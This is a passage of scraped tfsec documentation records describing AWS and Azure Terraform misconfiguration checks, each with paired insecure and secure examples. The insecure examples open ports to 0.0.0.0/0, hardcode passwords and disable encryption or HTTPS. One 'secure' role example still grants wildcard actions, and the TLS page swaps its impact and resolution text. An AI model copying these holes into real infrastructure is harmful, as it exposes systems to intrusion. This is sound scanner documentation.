= 22\n   to_port        = 22\n   rule_action    = \"allow\"\n   cidr_block     = \"0.0.0.0/0\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/network_acl_rule#to_port](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/network_acl_rule#to_port){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/vpc/latest/userguide/vpc-network-acls.html](https://docs.aws.amazon.com/vpc/latest/userguide/vpc-network-acls.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:35.457872"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/vpc/no-public-egress-sgr/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/vpc/no-public-egress-sgr/index.md", "content": "---\ntitle: An egress security group rule allows traffic to /0.\n---\n\n# An egress security group rule allows traffic to /0.\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nOpening up ports to connect out to the public internet is generally to be avoided. You should restrict access to IP addresses or ranges that are explicitly required where possible.\n\n### Possible Impact\nYour port is egressing data to the internet\n\n### Suggested Resolution\nSet a more restrictive cidr range\n\n\n### Insecure Example\n\nThe following example will fail the aws-vpc-no-public-egress-sgr check.\n```terraform\n\n resource \"aws_security_group\" \"bad_example\" {\n \tegress {\n \t\tcidr_blocks = [\"0.0.0.0/0\"]\n \t}\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-vpc-no-public-egress-sgr check.\n```terraform\n\n resource \"aws_security_group\" \"good_example\" {\n \tegress {\n \t\tcidr_blocks = [\"1.2.3.4/32\"]\n \t}\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/whitepapers/latest/building-scalable-secure-multi-vpc-network-infrastructure/centralized-egress-to-internet.html](https://docs.aws.amazon.com/whitepapers/latest/building-scalable-secure-multi-vpc-network-infrastructure/centralized-egress-to-internet.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:35.728029"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/vpc/no-public-ingress-acl/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/vpc/no-public-ingress-acl/index.md", "content": "---\ntitle: An ingress Network ACL rule allows specific ports from /0.\n---\n\n# An ingress Network ACL rule allows specific ports from /0.\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nOpening up ACLs to the public internet is potentially dangerous. You should restrict access to IP addresses or ranges that explicitly require it where possible.\n\n### Possible Impact\nThe ports are exposed for ingressing data to the internet\n\n### Suggested Resolution\nSet a more restrictive cidr range\n\n\n### Insecure Example\n\nThe following example will fail the aws-vpc-no-public-ingress-acl check.\n```terraform\n\n resource \"aws_network_acl_rule\" \"bad_example\" {\n   egress         = false\n   protocol       = \"tcp\"\n   from_port      = 22\n   to_port        = 22\n   rule_action    = \"allow\"\n   cidr_block     = \"0.0.0.0/0\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-vpc-no-public-ingress-acl check.\n```terraform\n\n resource \"aws_network_acl_rule\" \"good_example\" {\n   egress         = false\n   protocol       = \"tcp\"\n   from_port      = 22\n   to_port        = 22\n   rule_action    = \"allow\"\n   cidr_block     = \"10.0.0.0/16\"\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/network_acl_rule#cidr_block](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/network_acl_rule#cidr_block){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/vpc/latest/userguide/vpc-network-acls.html](https://docs.aws.amazon.com/vpc/latest/userguide/vpc-network-acls.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:36.012785"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/vpc/no-public-ingress-sgr/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/vpc/no-public-ingress-sgr/index.md", "content": "---\ntitle: An ingress security group rule allows traffic from /0.\n---\n\n# An ingress security group rule allows traffic from /0.\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nOpening up ports to the public internet is generally to be avoided. You should restrict access to IP addresses or ranges that explicitly require it where possible.\n\n### Possible Impact\nYour port exposed to the internet\n\n### Suggested Resolution\nSet a more restrictive cidr range\n\n\n### Insecure Example\n\nThe following example will fail the aws-vpc-no-public-ingress-sgr check.\n```terraform\n\n resource \"aws_security_group_rule\" \"bad_example\" {\n \ttype = \"ingress\"\n \tcidr_blocks = [\"0.0.0.0/0\"]\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-vpc-no-public-ingress-sgr check.\n```terraform\n\n resource \"aws_security_group_rule\" \"good_example\" {\n \ttype = \"ingress\"\n \tcidr_blocks = [\"10.0.0.0/16\"]\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule#cidr_blocks](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/security_group_rule#cidr_blocks){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/security-group-rules-reference.html](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/security-group-rules-reference.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:36.282973"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/aws/workspaces/enable-disk-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/aws/workspaces/enable-disk-encryption/index.md", "content": "---\ntitle: Root and user volumes on Workspaces should be encrypted\n---\n\n# Root and user volumes on Workspaces should be encrypted\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nWorkspace volumes for both user and root should be encrypted to protect the data stored on them.\n\n### Possible Impact\nData can be freely read if compromised\n\n### Suggested Resolution\nRoot and user volume encryption should be enabled\n\n\n### Insecure Example\n\nThe following example will fail the aws-workspaces-enable-disk-encryption check.\n```terraform\n\n resource \"aws_workspaces_workspace\" \"bad_example\" {\n \tdirectory_id = aws_workspaces_directory.test.id\n \tbundle_id    = data.aws_workspaces_bundle.value_windows_10.id\n \tuser_name    = \"Administrator\"\n   \n \tworkspace_properties {\n \t  compute_type_name                         = \"VALUE\"\n \t  user_volume_size_gib                      = 10\n \t  root_volume_size_gib                      = 80\n \t  running_mode                              = \"AUTO_STOP\"\n \t  running_mode_auto_stop_timeout_in_minutes = 60\n \t}\n   }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the aws-workspaces-enable-disk-encryption check.\n```terraform\n\t\n resource \"aws_workspaces_workspace\" \"good_example\" {\n \t\tdirectory_id \t\t\t\t   = aws_workspaces_directory.test.id\n \t\tbundle_id    \t\t\t\t   = data.aws_workspaces_bundle.value_windows_10.id\n \t\tuser_name    \t\t\t\t   = \"Administrator\"\n \t\troot_volume_encryption_enabled = true\n \t\tuser_volume_encryption_enabled = true\n \t  \n \t\tworkspace_properties {\n \t\t  compute_type_name                         = \"VALUE\"\n \t\t  user_volume_size_gib                      = 10\n \t\t  root_volume_size_gib                      = 80\n \t\t  running_mode                              = \"AUTO_STOP\"\n \t\t  running_mode_auto_stop_timeout_in_minutes = 60\n \t\t}\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/workspaces_workspace#root_volume_encryption_enabled](https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/workspaces_workspace#root_volume_encryption_enabled){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.aws.amazon.com/workspaces/latest/adminguide/encrypt-workspaces.html](https://docs.aws.amazon.com/workspaces/latest/adminguide/encrypt-workspaces.html){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:36.863591"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/appservice/account-identity-registered/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/appservice/account-identity-registered/index.md", "content": "---\ntitle: Web App has registration with AD enabled\n---\n\n# Web App has registration with AD enabled\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nRegistering the identity used by an App with AD allows it to interact with other services without using username and password\n\n### Possible Impact\nInteraction between services can't easily be achieved without username/password\n\n### Suggested Resolution\nRegister the app identity with AD\n\n\n### Insecure Example\n\nThe following example will fail the azure-appservice-account-identity-registered check.\n```terraform\n\n resource \"azurerm_app_service\" \"bad_example\" {\n   name                = \"example-app-service\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n   app_service_plan_id = azurerm_app_service_plan.example.id\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-appservice-account-identity-registered check.\n```terraform\n\n resource \"azurerm_app_service\" \"good_example\" {\n   name                = \"example-app-service\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n   app_service_plan_id = azurerm_app_service_plan.example.id\n \n   identity {\n     type = \"UserAssigned\"\n     identity_ids = \"webapp1\"\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#identity](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#identity){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:37.607346"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/appservice/authentication-enabled/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/appservice/authentication-enabled/index.md", "content": "---\ntitle: App Service authentication is activated\n---\n\n# App Service authentication is activated\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nEnabling authentication ensures that all communications in the application are authenticated. The auth_settings block needs to be filled out with the appropriate auth backend settings\n\n### Possible Impact\nAnonymous HTTP requests will be accepted\n\n### Suggested Resolution\nEnable authentication to prevent anonymous request being accepted\n\n\n### Insecure Example\n\nThe following example will fail the azure-appservice-authentication-enabled check.\n```terraform\n\n resource \"azurerm_app_service\" \"bad_example\" {\n   name                = \"example-app-service\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n   app_service_plan_id = azurerm_app_service_plan.example.id\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-appservice-authentication-enabled check.\n```terraform\n\n resource \"azurerm_app_service\" \"good_example\" {\n   name                = \"example-app-service\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n   app_service_plan_id = azurerm_app_service_plan.example.id\n \n   auth_settings {\n     enabled = true\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#enabled](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#enabled){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:37.883406"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/appservice/enable-http2/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/appservice/enable-http2/index.md", "content": "---\ntitle: Web App uses the latest HTTP version\n---\n\n# Web App uses the latest HTTP version\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nUse the latest version of HTTP to ensure you are benefiting from security fixes\n\n### Possible Impact\nOutdated versions of HTTP has security vulnerabilities\n\n### Suggested Resolution\nUse the latest version of HTTP\n\n\n### Insecure Example\n\nThe following example will fail the azure-appservice-enable-http2 check.\n```terraform\n\n resource \"azurerm_app_service\" \"bad_example\" {\n   name                = \"example-app-service\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n   app_service_plan_id = azurerm_app_service_plan.example.id\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-appservice-enable-http2 check.\n```terraform\n\n resource \"azurerm_app_service\" \"good_example\" {\n   name                = \"example-app-service\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n   app_service_plan_id = azurerm_app_service_plan.example.id\n \n   site_config {\n \t  http2_enabled = true\n   }\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#http2_enabled](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#http2_enabled){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:38.188227"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/appservice/enforce-https/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/appservice/enforce-https/index.md", "content": "---\ntitle: Ensure the Function App can only be accessed via HTTPS. The default is false.\n---\n\n# Ensure the Function App can only be accessed via HTTPS. The default is false.\n\n### Default Severity: <span class=\"severity critical\">critical</span>\n\n### Explanation\n\nBy default, clients can connect to function endpoints by using both HTTP or HTTPS. You should redirect HTTP to HTTPs because HTTPS uses the SSL/TLS protocol to provide a secure connection, which is both encrypted and authenticated.\n\n### Possible Impact\nAnyone can access the Function App using HTTP.\n\n### Suggested Resolution\nYou can redirect all HTTP requests to the HTTPS port.\n\n\n### Insecure Example\n\nThe following example will fail the azure-appservice-enforce-https check.\n```terraform\n\n resource \"azurerm_function_app\" \"bad_example\" {\n   name                       = \"test-azure-functions\"\n   location                   = azurerm_resource_group.example.location\n   resource_group_name        = azurerm_resource_group.example.name\n   app_service_plan_id        = azurerm_app_service_plan.example.id\n   storage_account_name       = azurerm_storage_account.example.name\n   storage_account_access_key = azurerm_storage_account.example.primary_access_key\n   os_type                    = \"linux\"\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-appservice-enforce-https check.\n```terraform\n\n resource \"azurerm_function_app\" \"good_example\" {\n   name                       = \"test-azure-functions\"\n   location                   = azurerm_resource_group.example.location\n   resource_group_name        = azurerm_resource_group.example.name\n   app_service_plan_id        = azurerm_app_service_plan.example.id\n   storage_account_name       = azurerm_storage_account.example.name\n   storage_account_access_key = azurerm_storage_account.example.primary_access_key\n   os_type                    = \"linux\"\n   https_only                 = true\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/function_app#https_only](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/function_app#https_only){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/app-service/configure-ssl-bindings#enforce-https](https://docs.microsoft.com/en-us/azure/app-service/configure-ssl-bindings#enforce-https){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/azure-functions/security-concepts](https://docs.microsoft.com/en-us/azure/azure-functions/security-concepts){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:38.471818"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/appservice/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/appservice/index.md", "content": "---\ntitle: appservice\n---\n\n# appservice\n\n## Checks\n\n\n- [account-identity-registered](account-identity-registered) Web App has registration with AD enabled\n\n- [authentication-enabled](authentication-enabled) App Service authentication is activated\n\n- [enable-http2](enable-http2) Web App uses the latest HTTP version\n\n- [enforce-https](enforce-https) Ensure the Function App can only be accessed via HTTPS. The default is false.\n\n- [require-client-cert](require-client-cert) Web App accepts incoming client certificate\n\n- [use-secure-tls-policy](use-secure-tls-policy) Web App uses latest TLS version\n\n\n\n", "timestamp": "2025-10-24T22:24:38.599886"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/appservice/require-client-cert/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/appservice/require-client-cert/index.md", "content": "---\ntitle: Web App accepts incoming client certificate\n---\n\n# Web App accepts incoming client certificate\n\n### Default Severity: <span class=\"severity low\">low</span>\n\n### Explanation\n\nThe TLS mutual authentication technique in enterprise environments ensures the authenticity of clients to the server. If incoming client certificates are enabled only an authenticated client with valid certificates can access the app.\n\n### Possible Impact\nMutual TLS is not being used\n\n### Suggested Resolution\nEnable incoming certificates for clients\n\n\n### Insecure Example\n\nThe following example will fail the azure-appservice-require-client-cert check.\n```terraform\n\n resource \"azurerm_app_service\" \"bad_example\" {\n   name                = \"example-app-service\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n   app_service_plan_id = azurerm_app_service_plan.example.id\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-appservice-require-client-cert check.\n```terraform\n\n resource \"azurerm_app_service\" \"good_example\" {\n   name                = \"example-app-service\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n   app_service_plan_id = azurerm_app_service_plan.example.id\n   client_cert_enabled = true\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#client_cert_enabled](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#client_cert_enabled){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:38.876660"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/appservice/use-secure-tls-policy/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/appservice/use-secure-tls-policy/index.md", "content": "---\ntitle: Web App uses latest TLS version\n---\n\n# Web App uses latest TLS version\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nUse a more recent TLS/SSL policy for the App Service\n\n### Possible Impact\nThe minimum TLS version for apps should be TLS1_2\n\n### Suggested Resolution\nThe TLS version being outdated and has known vulnerabilities\n\n\n### Insecure Example\n\nThe following example will fail the azure-appservice-use-secure-tls-policy check.\n```terraform\n\n resource \"azurerm_app_service\" \"bad_example\" {\n   name                = \"example-app-service\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n   app_service_plan_id = azurerm_app_service_plan.example.id\n \n   site_config {\n \t  min_tls_version = \"1.0\"\n   }\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-appservice-use-secure-tls-policy check.\n```terraform\n\n resource \"azurerm_app_service\" \"good_example\" {\n   name                = \"example-app-service\"\n   location            = azurerm_resource_group.example.location\n   resource_group_name = azurerm_resource_group.example.name\n   app_service_plan_id = azurerm_app_service_plan.example.id\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#min_tls_version](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/app_service#min_tls_version){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:39.150598"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/authorization/limit-role-actions/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/authorization/limit-role-actions/index.md", "content": "---\ntitle: Roles limited to the required actions\n---\n\n# Roles limited to the required actions\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nThe permissions granted to a role should be kept to the minimum required to be able to do the task. Wildcard permissions must not be used.\n\n### Possible Impact\nOpen permissions for subscriptions could result in an easily compromisable account\n\n### Suggested Resolution\nUse targeted permissions for roles\n\n\n### Insecure Example\n\nThe following example will fail the azure-authorization-limit-role-actions check.\n```terraform\n\n data \"azurerm_subscription\" \"primary\" {\n }\n \n resource \"azurerm_role_definition\" \"example\" {\n   name        = \"my-custom-role\"\n   scope       = data.azurerm_subscription.primary.id\n   description = \"This is a custom role created via Terraform\"\n \n   permissions {\n     actions     = [\"*\"]\n     not_actions = []\n   }\n \n   assignable_scopes = [\n     \"/\"\n   ]\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-authorization-limit-role-actions check.\n```terraform\n\n data \"azurerm_subscription\" \"primary\" {\n }\n \n resource \"azurerm_role_definition\" \"example\" {\n   name        = \"my-custom-role\"\n   scope       = data.azurerm_subscription.primary.id\n   description = \"This is a custom role created via Terraform\"\n \n   permissions {\n     actions     = [\"*\"]\n     not_actions = []\n   }\n \n   assignable_scopes = [\n     data.azurerm_subscription.primary.id,\n   ]\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/role_definition#actions](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/role_definition#actions){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:39.737343"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/compute/disable-password-authentication/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/compute/disable-password-authentication/index.md", "content": "---\ntitle: Password authentication should be disabled on Azure virtual machines\n---\n\n# Password authentication should be disabled on Azure virtual machines\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nAccess to virtual machines should be authenticated using SSH keys. Removing the option of password authentication enforces more secure methods while removing the risks inherent with passwords.\n\n### Possible Impact\nUsing password authentication is less secure that ssh keys may result in compromised servers\n\n### Suggested Resolution\nUse ssh authentication for virtual machines\n\n\n### Insecure Example\n\nThe following example will fail the azure-compute-disable-password-authentication check.\n```terraform\n\n resource \"azurerm_linux_virtual_machine\" \"bad_linux_example\" {\n   name                            = \"bad-linux-machine\"\n   resource_group_name             = azurerm_resource_group.example.name\n   location                        = azurerm_resource_group.example.location\n   size                            = \"Standard_F2\"\n   admin_username                  = \"adminuser\"\n   admin_password                  = \"somePassword\"\n   disable_password_authentication = false\n }\n \n resource \"azurerm_virtual_machine\" \"bad_example\" {\n \tname                            = \"bad-linux-machine\"\n \tresource_group_name             = azurerm_resource_group.example.name\n \tlocation                        = azurerm_resource_group.example.location\n \tsize                            = \"Standard_F2\"\n \tadmin_username                  = \"adminuser\"\n \tadmin_password                  = \"somePassword\"\n \n \tos_profile {\n \t\tcomputer_name  = \"hostname\"\n \t\tadmin_username = \"testadmin\"\n \t\tadmin_password = \"Password1234!\"\n \t}\n \n \tos_profile_linux_config {\n \t\tdisable_password_authentication = false\n \t}\n   }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-compute-disable-password-authentication check.\n```terraform\n\n resource \"azurerm_linux_virtual_machine\" \"good_linux_example\" {\n   name                            = \"good-linux-machine\"\n   resource_group_name             = azurerm_resource_group.example.name\n   location                        = azurerm_resource_group.example.location\n   size                            = \"Standard_F2\"\n   admin_username                  = \"adminuser\"\n   admin_password                  = \"somePassword\"\n   \n   admin_ssh_key {\n     username   = \"adminuser\"\n     public_key = file(\"~/.ssh/id_rsa.pub\")\n   }\n }\n \n resource \"azurerm_virtual_machine\" \"good_example\" {\n \tname                            = \"good-linux-machine\"\n \tresource_group_name             = azurerm_resource_group.example.name\n \tlocation                        = azurerm_resource_group.example.location\n \tsize                            = \"Standard_F2\"\n \tadmin_username                  = \"adminuser\"\n \n \t\n \tos_profile_linux_config {\n \t\tssh_keys = [{\n \t\t\tkey_data = file(\"~/.ssh/id_rsa.pub\")\n \t\t\tpath = \"~/.ssh/id_rsa.pub\"\n \t\t}]\n \n \t\tdisable_password_authentication = true\n \t}\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/linux_virtual_machine#disable_password_authentication](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/linux_virtual_machine#disable_password_authentication){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/virtual_machine#disable_password_authentication](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/virtual_machine#disable_password_authentication){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:40.197845"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/compute/enable-disk-encryption/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/compute/enable-disk-encryption/index.md", "content": "---\ntitle: Enable disk encryption on managed disk\n---\n\n# Enable disk encryption on managed disk\n\n### Default Severity: <span class=\"severity high\">high</span>\n\n### Explanation\n\nManage disks should be encrypted at rest. When specifying the <code>encryption_settings</code> block, the enabled attribute should be set to <code>true</code>.\n\n### Possible Impact\nData could be read if compromised\n\n### Suggested Resolution\nEnable encryption on managed disks\n\n\n### Insecure Example\n\nThe following example will fail the azure-compute-enable-disk-encryption check.\n```terraform\n\n resource \"azurerm_managed_disk\" \"bad_example\" {\n \tencryption_settings {\n \t\tenabled = false\n \t}\n }\n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-compute-enable-disk-encryption check.\n```terraform\n\n resource \"azurerm_managed_disk\" \"good_example\" {\n \tencryption_settings {\n \t\tenabled = true\n \t}\n }\n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/managed_disk](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/managed_disk){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n- [https://docs.microsoft.com/en-us/azure/virtual-machines/linux/disk-encryption](https://docs.microsoft.com/en-us/azure/virtual-machines/linux/disk-encryption){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:40.486335"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/compute/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/compute/index.md", "content": "---\ntitle: compute\n---\n\n# compute\n\n## Checks\n\n\n- [disable-password-authentication](disable-password-authentication) Password authentication should be disabled on Azure virtual machines\n\n- [enable-disk-encryption](enable-disk-encryption) Enable disk encryption on managed disk\n\n- [no-secrets-in-custom-data](no-secrets-in-custom-data) Ensure that no sensitive credentials are exposed in VM custom_data\n\n\n\n", "timestamp": "2025-10-24T22:24:40.594016"}
{"source": "github", "repo": "aquasecurity/tfsec", "file": "docs/checks/azure/compute/no-secrets-in-custom-data/index.md", "url": "https://github.com/aquasecurity/tfsec/blob/master/docs/checks/azure/compute/no-secrets-in-custom-data/index.md", "content": "---\ntitle: Ensure that no sensitive credentials are exposed in VM custom_data\n---\n\n# Ensure that no sensitive credentials are exposed in VM custom_data\n\n### Default Severity: <span class=\"severity medium\">medium</span>\n\n### Explanation\n\nWhen creating Azure Virtual Machines, custom_data is used to pass start up information into the EC2 instance. This custom_dat must not contain access key credentials.\n\n### Possible Impact\nSensitive credentials in custom_data can be leaked\n\n### Suggested Resolution\nDon't use sensitive credentials in the VM custom_data\n\n\n### Insecure Example\n\nThe following example will fail the azure-compute-no-secrets-in-custom-data check.\n```terraform\n\n resource \"azurerm_virtual_machine\" \"bad_example\" {\n \tname = \"bad_example\"\n\tos_profile_linux_config {\n\t\tdisable_password_authentication = false\n\t}\n\tos_profile {\n\t\tcustom_data =<<EOF\n\t\t\texport DATABASE_PASSWORD=\\\"SomeSortOfPassword\\\"\n\t\t\tEOF\n\t}\n }\n \n```\n\n\n\n### Secure Example\n\nThe following example will pass the azure-compute-no-secrets-in-custom-data check.\n```terraform\n\n resource \"azurerm_virtual_machine\" \"good_example\" {\n \tname = \"good_example\"\n\tos_profile_linux_config {\n\t\tdisable_password_authentication = false\n\t}\n\tos_profile {\n\t\tcustom_data =<<EOF\n\t\t\texport GREETING=\"Hello there\"\n\t\t\tEOF\n\t}\n }\n \n```\n\n\n\n### Links\n\n\n- [https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/virtual_machine#custom_data](https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/virtual_machine#custom_data){:target=\"_blank\" rel=\"nofollow noreferrer noopener\"}\n\n\n\n", "timestamp": "2025-10-24T22:24:40.962983"}
